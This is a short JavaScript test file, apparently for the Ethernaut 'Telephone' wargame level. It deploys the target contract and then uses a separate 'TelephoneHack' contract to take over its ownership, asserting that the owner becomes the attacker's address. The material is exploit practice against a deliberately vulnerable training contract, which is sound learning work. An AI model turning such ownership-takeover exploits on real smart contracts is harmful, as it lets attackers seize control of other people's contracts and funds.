const { expect } = require("chai");
const { ethers } = require("hardhat");

describe("Telephone", function () {

    it("takes ownership of contract", async function () {
        [owner, attacker] = await ethers.getSigners();;
        const Telephone = await ethers.getContractFactory("Telephone");
        const contract = await Telephone.deploy();
        await contract.deployed();

        await contract.changeOwner(attacker.address);
        expect(await contract.owner()).to.equal(owner.address);

        const TelephoneHack = await ethers.getContractFactory("TelephoneHack");
        const hack = await TelephoneHack.deploy();
        await hack.deployed();

        await hack.changeOwner(contract.address, attacker.address);
        expect(await contract.owner()).to.equal(attacker.address);

    });
});
